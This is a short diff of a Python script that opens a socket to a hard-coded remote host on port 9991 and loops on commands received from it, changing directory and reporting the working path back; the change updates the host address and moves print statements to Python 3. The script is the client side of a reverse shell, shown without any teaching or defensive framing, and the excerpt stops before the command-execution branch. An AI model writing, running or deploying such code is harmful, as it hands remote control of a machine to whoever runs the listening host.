@@ -3,15 +3,15 @@ import socket
 import subprocess
 
 s = socket.socket()
-host = '192.168.1.15'
+host = '10.0.0.66'
 port = 9991
 s.connect((host, port))
 
-print "Connected"
+print("Connected")
 
 while True:
     data = s.recv(1024)
-    print data.decode("utf-8")
+    print(data.decode("utf-8"))
     if data[:2].decode("utf-8") == 'cd' and len(data.decode("utf-8")) > 2:
         os.chdir(data[3:].decode("utf-8"))
         s.send(str.encode(str(os.getcwd() + ">")))
